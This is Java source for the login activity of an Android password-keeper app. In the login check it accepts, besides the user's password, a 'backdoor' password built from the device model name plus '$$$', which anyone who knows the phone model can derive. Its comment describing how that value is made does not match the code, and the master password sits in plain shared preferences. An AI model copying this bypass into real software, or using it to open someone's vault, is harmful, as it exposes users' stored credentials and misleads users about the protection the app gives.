package appdev.sapir.maor.passkeeper;

import android.annotation.TargetApi;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.Toast;

public class LoginActivity extends AppCompatActivity {

    /**
     * global class variables
     */
    private Intent intent;
    private EditText mPassword;
    private SharedPreferences data;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getSupportActionBar().hide();

        setInitialData();

        setContentView(R.layout.activity_login);

        mPassword = (EditText) findViewById(R.id.etpEnterPassword);

    }

    /**
     *onClick method which apply to login activity, clear function, and cancel
     * @param view
     */
    public void onClick(View view) {

        switch (view.getId()) {
            case R.id.btnLogin:
                String pass = data.getString(getString(R.string.data_vname_pass), "");
                String backdoor = getUniqueBackdoorPass();
                if ((mPassword.getText().toString().equals(pass)) || ((mPassword.getText()).toString().equals(backdoor))) {
                    continueToMain();
                } else {
                    Toast.makeText(this, getString(R.string.error_msg_login_inc_pass), Toast.LENGTH_SHORT).show();
                }
                break;
            case R.id.btnClear:
                mPassword.setText("");
                break;
            case R.id.btnForgotPass:
                setForgotPassDialog();
                break;
            case R.id.btnCancel:
                this.onBackPressed();
        }

    }

    private void setInitialData() {
        data = getSharedPreferences(getString(R.string.data_uri_name), Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = data.edit();
        if (!(data.contains(getString(R.string.data_vname_have_entry_pass)))) {
            editor.putBoolean(getString(R.string.data_vname_have_entry_pass), false);
            editor.putString(getString(R.string.data_vname_pass), "");
            editor.commit();
        }
        if (!(data.getBoolean(getString(R.string.data_vname_have_entry_pass), false))) {
            continueToMain();
        }
    }

    @Override
    protected void onPause() {
        this.finish();
        super.onPause();
    }

    private void continueToMain() {
        intent = new Intent(this, PassKeeperMainActivity.class);
        this.startActivity(intent);
    }

    /**
     * Method which set and show the dialog window to notify the user on in Hint password (clue).
     */
    private void setForgotPassDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(getString(R.string.data_vname_pass_hint));
        builder.setMessage(getString(R.string.err_msg_forgot_pass) + data.getString(String.valueOf(getString(R.string.data_vname_pass_hint)), ""));
        builder.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int id) {
                dialog.cancel();
            }
        });
        AlertDialog dialog = builder.create();
        dialog.show();
    }

    /**
     * Method which creates a unique backdoor password.
     * @return string value on the fifth chars of the Build Number of the device.
     */
    private String getUniqueBackdoorPass(){
        String android_id = Build.MODEL.toLowerCase().replace(" ","")+"$$$";
        return (android_id);
    }
}

